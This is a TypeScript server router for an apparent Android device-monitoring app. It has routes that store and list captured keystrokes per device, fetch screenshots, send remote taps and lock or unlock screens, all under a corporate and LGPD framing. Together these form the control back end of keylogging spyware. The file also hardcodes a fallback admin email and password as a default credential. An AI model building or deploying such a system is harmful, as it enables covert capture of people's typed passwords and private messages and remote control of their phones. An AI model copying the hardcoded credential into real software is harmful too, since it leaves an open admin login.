import { z } from "zod";
import { getSessionCookieOptions } from "./_core/cookies";
import { COOKIE_NAME, ONE_YEAR_MS } from "../shared/const";
import { systemRouter } from "./_core/systemRouter";
import { publicProcedure, protectedProcedure, router } from "./_core/trpc";
import { createKeylog, getKeylogsByDevice, deleteKeylog, restoreKeylog, getDeletedKeylogs, deleteKeylogsByDevice } from "./db";
import { startKeylogSimulator } from "./keylogSimulator";
import { apkRouter } from "./routers/apk";
import { corporateRouter } from "./routers/corporate";
import { lgpdRequestsRouter } from "./routers/lgpd-requests";
import { deleteDeviceData, getUserDevicesSummary, getScreenshots } from "./corporate-db";
import { sdk } from "./_core/sdk";
import { upsertUser } from "./db";
import { enqueueLockCommand, enqueueUnlockCommand, enqueueTapCommand } from "./remote-control-queue";

const LOCAL_AUTH_EMAIL = (process.env.LOCAL_AUTH_EMAIL ?? "admin@faztudo.com").trim().toLowerCase();
const LOCAL_AUTH_PASSWORD = (process.env.LOCAL_AUTH_PASSWORD ?? "Mm102030@@").trim();

export const appRouter = router({
    // if you need to use socket.io, read and register route in server/_core/index.ts, all api should start with '/api/' so that the gateway can route correctly
  system: systemRouter,
  auth: router({
    me: publicProcedure.query(opts => opts.ctx.user),
    login: publicProcedure
      .input(
        z.object({
          email: z.string().email(),
          password: z.string().min(1),
        })
      )
      .mutation(async ({ ctx, input }) => {
        if (!LOCAL_AUTH_PASSWORD) {
          throw new Error("LOCAL_AUTH_PASSWORD is not configured");
        }

        const email = input.email.trim().toLowerCase();
        const password = input.password;

        if (email !== LOCAL_AUTH_EMAIL || password !== LOCAL_AUTH_PASSWORD) {
          throw new Error("Email ou senha invalidos");
        }

        const openId = `local:${email}`;
        const name = email.split("@")[0] || "Administrador";

        await upsertUser({
          openId,
          email,
          name,
          loginMethod: "local",
          role: "admin",
          lastSignedIn: new Date(),
        });

        const sessionToken = await sdk.createSessionToken(openId, {
          name,
          expiresInMs: ONE_YEAR_MS,
        });

        const cookieOptions = getSessionCookieOptions(ctx.req);
        ctx.res.cookie(COOKIE_NAME, sessionToken, {
          ...cookieOptions,
          maxAge: ONE_YEAR_MS,
        });

        return { success: true } as const;
      }),
    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
      return {
        success: true,
      } as const;
    }),
  }),

  keylogs: router({
    list: protectedProcedure
      .input(z.object({ deviceId: z.string() }))
      .query(async ({ input }) => {
        return await getKeylogsByDevice(input.deviceId);
      }),
    
    create: protectedProcedure
      .input(z.object({
        deviceId: z.string(),
        appName: z.string(),
        keyText: z.string(),
      }))
      .mutation(async ({ input, ctx }) => {
        await createKeylog({
          deviceId: input.deviceId,
          userId: ctx.user.id,
          appName: input.appName,
          keyText: input.keyText,
        });
        return { success: true };
      }),
    
    delete: protectedProcedure
      .input(z.object({ keylogId: z.number() }))
      .mutation(async ({ input }) => {
        await deleteKeylog(input.keylogId);
        return { success: true };
      }),
    
    restore: protectedProcedure
      .input(z.object({ keylogId: z.number() }))
      .mutation(async ({ input }) => {
        await restoreKeylog(input.keylogId);
        return { success: true };
      }),
    
    deleted: protectedProcedure
      .input(z.object({ deviceId: z.string() }))
      .query(async ({ input }) => {
        return await getDeletedKeylogs(input.deviceId);
      }),
    
    startSimulator: protectedProcedure
      .input(z.object({ deviceId: z.string() }))
      .mutation(async ({ input, ctx }) => {
        await startKeylogSimulator(input.deviceId, ctx.user.id);
        return { success: true, message: "Simulador de keylogs iniciado" };
      }),
  }),

  device: router({
    list: protectedProcedure.query(async ({ ctx }) => {
      return await getUserDevicesSummary(ctx.user.id);
    }),

    remove: protectedProcedure
      .input(z.object({ deviceId: z.number() }))
      .mutation(async ({ ctx, input }) => {
        await deleteDeviceData(ctx.user.id, input.deviceId);
        await deleteKeylogsByDevice(String(input.deviceId));
        return { success: true };
      }),

    latestScreenshot: protectedProcedure
      .input(z.object({ deviceId: z.number() }))
      .query(async ({ ctx, input }) => {
        const results = await getScreenshots(ctx.user.id, input.deviceId, 1);
        return results[0] ?? null;
      }),

    screenshots: protectedProcedure
      .input(z.object({ deviceId: z.number(), limit: z.number().default(20) }))
      .query(async ({ ctx, input }) => {
        return await getScreenshots(ctx.user.id, input.deviceId, input.limit);
      }),

    sendTap: protectedProcedure
      .input(z.object({ deviceId: z.number(), xPercent: z.number(), yPercent: z.number() }))
      .mutation(async ({ ctx, input }) => {
        enqueueTapCommand(ctx.user.id, input.deviceId, input.xPercent, input.yPercent);
        return { success: true };
      }),
  }),

  screenLock: router({
    lock: protectedProcedure
      .input(z.object({ deviceId: z.number() }))
      .mutation(async ({ ctx, input }) => {
        enqueueLockCommand(ctx.user.id, input.deviceId);
        return { success: true, locked: true };
      }),
    unlock: protectedProcedure
      .input(z.object({ deviceId: z.number() }))
      .mutation(async ({ ctx, input }) => {
        enqueueUnlockCommand(ctx.user.id, input.deviceId);
        return { success: true, locked: false };
      }),
  }),

  corporate: corporateRouter,
  apk: apkRouter,
  lgpd: lgpdRequestsRouter,
});

export type AppRouter = typeof appRouter;
